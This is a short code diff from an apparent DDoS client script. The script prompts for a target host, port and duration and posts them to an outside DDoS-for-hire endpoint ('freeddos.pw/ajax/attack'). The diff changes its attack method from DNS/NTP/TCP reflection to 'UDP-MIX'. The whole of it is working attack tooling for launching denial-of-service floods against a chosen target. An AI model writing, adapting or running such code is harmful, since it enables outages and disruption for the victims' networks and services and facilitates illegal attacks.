@@ -24,12 +24,12 @@ def attack_DNS_NTP_TCPMB():
     port = int(input('%sPort%s: '%(B,C)))
     time = int(input('%sTime%s: '%(B,C)))
 
-    method = 'DNS_NTP_TCPMB' #   DNS + NTP + TCP Reflection
+    method = 'UDP-MIX' #   UDP-MIX
 
     data = f"host={ip}&port={port}&time={time}&method={method}"
     url = "https://freeddos.pw/ajax/attack"
 
-    method = 'DNS + NTP + TCP Reflection'
+    method = 'UDP-MIX'
 
     try:
         request = requests.post(url, headers=header, data=data).text
